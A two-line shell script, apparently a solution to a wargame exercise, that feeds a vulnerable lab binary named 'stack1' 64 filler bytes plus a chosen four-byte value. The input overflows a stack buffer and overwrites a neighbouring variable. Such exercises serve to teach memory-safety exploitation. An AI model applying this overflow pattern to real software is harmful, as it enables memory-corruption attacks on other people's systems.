#! /bin/sh
./stack1 `python -c "print 'A'*64+'\x64\x63\x62\x61'"`
